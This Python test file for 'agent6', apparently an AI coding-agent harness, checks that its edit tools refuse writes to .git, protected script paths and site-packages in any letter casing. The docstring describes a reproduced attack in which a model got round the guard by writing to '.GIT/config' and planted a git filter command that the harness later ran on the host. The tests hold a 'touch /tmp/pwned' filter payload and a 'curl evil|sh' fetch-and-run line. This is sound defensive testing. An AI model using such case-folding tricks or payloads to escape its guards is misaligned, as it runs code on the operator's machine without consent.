# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Eric Lesiuta
"""A protected location is protected however its name is cased.

The edit tools write in-process, outside the jail, so their own refusals are
the whole protection -- and on macOS, where agent6 runs unsandboxed, they are
the ONLY protection for `.git`. macOS and Windows match filenames
case-insensitively, so an exact comparison let `.GIT/config` through while it
opened the real `.git/config`: reproduced on a casefolded ext4, where the
model planted `filter.pwn.clean` in the live config -- the command agent6's
own auto-commit then runs on the host, which is the attack the guard exists
to stop.

The refusals here hold on every platform; the folding is not conditional on
the filesystem, so a case-sensitive host refuses a distinct `.GIT` too.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from agent6.config import Config
from agent6.tools.dispatch import ToolDispatcher
from agent6.tools.errors import ToolError

CASINGS = [".git", ".GIT", ".Git", ".gIt"]


def _repo(tmp_path: Path) -> Path:
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    (tmp_path / "f.txt").write_text("hello\n", encoding="utf-8")
    return tmp_path


@pytest.mark.parametrize("cased", CASINGS)
def test_the_git_dir_is_refused_in_any_casing(tmp_path: Path, cased: str) -> None:
    root = _repo(tmp_path)
    d = ToolDispatcher(root=root, config=Config(), isolation="none")
    payload = '[filter "pwn"]\n\tclean = touch /tmp/pwned\n[core]'
    try:
        with pytest.raises(ToolError, match="Refusing to write under"):
            d.dispatch(
                "apply_edit",
                {
                    "path": f"{cased}/config",
                    "edits": [{"old_string": "[core]", "new_string": payload}],
                },
            )
        patch = f"--- a/{cased}/config\n+++ b/{cased}/config\n@@ -1 +1,2 @@\n [core]\n+x\n"
        with pytest.raises(ToolError, match="Refusing to write under"):
            d.dispatch("apply_patch", {"patch": patch})
    finally:
        d.close()
    assert "filter" not in (root / ".git" / "config").read_text(encoding="utf-8")


def test_a_protect_path_covers_the_same_name_cased_differently(tmp_path: Path) -> None:
    """The machine-bundle guard: a `mode="run"` state must not rewrite the
    scripts the next run executes, whichever way it spells them."""
    protected = tmp_path / "scripts"
    protected.mkdir()
    (protected / "build.sh").write_text("echo real\n", encoding="utf-8")
    d = ToolDispatcher(
        root=tmp_path,
        config=Config(),
        isolation="none",
        extra_protect_paths=(protected.resolve(),),
    )
    try:
        for cased in ("scripts", "SCRIPTS", "Scripts"):
            with pytest.raises(ToolError, match="protected path"):
                d.dispatch(
                    "apply_edit",
                    {
                        "path": f"{cased}/build.sh",
                        "edits": [{"old_string": "echo real", "new_string": "curl evil|sh"}],
                    },
                )
    finally:
        d.close()
    assert (protected / "build.sh").read_text(encoding="utf-8") == "echo real\n"


def test_an_installed_package_tree_is_refused_in_any_casing(tmp_path: Path) -> None:
    """Editing an installed tree corrupts the operator's venv, and being
    gitignored the damage never shows in a diff."""
    for cased in ("site-packages", "SITE-PACKAGES", "Site-Packages"):
        tree = tmp_path / "lib" / cased / "pkg"
        tree.mkdir(parents=True)
        (tree / "mod.py").write_text("VALUE = 1\n", encoding="utf-8")
        d = ToolDispatcher(root=tmp_path, config=Config(), isolation="none")
        try:
            with pytest.raises(ToolError, match="installed-package tree"):
                d.dispatch(
                    "apply_edit",
                    {
                        "path": f"lib/{cased}/pkg/mod.py",
                        "edits": [{"old_string": "VALUE = 1", "new_string": "VALUE = 2"}],
                    },
                )
        finally:
            d.close()
        assert (tree / "mod.py").read_text(encoding="utf-8") == "VALUE = 1\n"


def test_a_neighbour_that_merely_starts_the_same_is_untouched(tmp_path: Path) -> None:
    """Folding compares whole components: `.github` is ordinary content."""
    root = _repo(tmp_path)
    (root / ".github" / "workflows").mkdir(parents=True)
    (root / ".github" / "workflows" / "ci.yml").write_text("on: push\n", encoding="utf-8")
    d = ToolDispatcher(root=root, config=Config(), isolation="none")
    try:
        d.dispatch(
            "apply_edit",
            {
                "path": ".github/workflows/ci.yml",
                "edits": [{"old_string": "on: push", "new_string": "on: pull_request"}],
            },
        )
    finally:
        d.close()
    assert "pull_request" in (root / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
